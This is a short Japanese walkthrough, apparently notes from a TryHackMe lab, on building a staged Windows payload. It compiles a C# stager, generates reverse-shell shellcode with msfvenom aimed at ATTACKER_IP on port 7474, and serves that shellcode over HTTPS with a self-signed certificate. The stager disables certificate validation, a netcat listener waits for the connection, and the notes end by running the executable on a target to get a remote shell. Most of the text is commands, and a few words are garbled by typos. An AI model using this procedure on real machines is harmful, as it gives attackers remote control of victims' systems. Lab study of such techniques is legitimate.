1. ステージャーをかく
`StagedPayload.cs`

2. ステージャーのコンパイル
windows上で行った。
```
csc StagedPayload.cs
```

3. ペイロードの作成
```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```
最後の`-b`は、`\x00`(NULLバイト)、`\x0a`（改行)、`\x0d`（キャリッジリターン）を含まないように指定している。ヘルコードがネットWー悪を介して送信されるとき、問題を引き起こす可能性があるから。

4. オレオレ証明書の作成
```
$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```
localhost.pemが作成される。

5. webサーバーの起動
THMのサンプルコードは、`wrap_socket`関数を使用しており、Python3.10以降では非推奨かつ削除されるので、書き直した。`hoge.py`

```
$ python hoge.py
```
こで、https://localhostにアクセスができる。ブラウザからアクセスすると自己署名の警告がでるが、ステージャーでは、以下の部分で警告が出ないように上書きしているので問題ない。
```
ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
```

6. リッスンポートの起動
```
$ nc -lvp 7474
```

7. 実行
これで、対象のマシーン上に、`StagedPayload.exe`をアップロードすれば、実行Sれて、待ち受けている7474ポートにリバースシェルが接続される。
